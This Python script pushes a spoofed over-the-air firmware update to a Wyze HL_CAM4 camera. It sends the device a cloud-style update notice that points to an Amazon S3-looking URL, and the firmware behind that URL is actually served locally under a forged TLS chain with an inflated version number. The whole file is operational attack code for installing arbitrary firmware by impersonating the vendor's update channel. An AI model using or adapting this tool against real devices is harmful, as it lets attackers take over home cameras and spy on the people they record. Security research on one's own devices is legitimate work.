#!/usr/bin/env python3
"""Publish one OTA delta for a local payload, using the cloud-shaped Amazon URL.

The camera validates TLS against its own bundle, so the payload must be served under the forged
chain (wyze_forge_serve.py) on :443 at the exact path below; this script only announces it.

  wyze_ota_push.py <thing> <MAC> [payload] [--version 9.9.9.9]
"""
import argparse, hashlib, os, sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from wyze_cloud import push  # noqa: E402

PATH = "/wuv2/upgrade/HL_CAM4/firmware/{ver}.tar"


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("thing")
    ap.add_argument("mac")
    ap.add_argument("payload", nargs="?", default="/tmp/fwserve/wuv2/upgrade/HL_CAM4/firmware/9.9.9.9.tar")
    ap.add_argument("--version", default="9.9.9.9")
    ap.add_argument("--host", default="s3-us-west-2.amazonaws.com")
    a = ap.parse_args()

    if not os.path.exists(a.payload):
        sys.exit(f"no payload at {a.payload}")
    md5 = hashlib.md5(open(a.payload, "rb").read()).hexdigest()
    url = f"https://{a.host}" + PATH.format(ver=a.version)
    print(f"payload {a.payload} md5 {md5}\nurl {url}")
    push(a.thing, a.mac.upper(), url, md5)
    print("now watch the TLS log for the GET, and do not reconnect")
    return 0


if __name__ == "__main__":
    sys.exit(main())
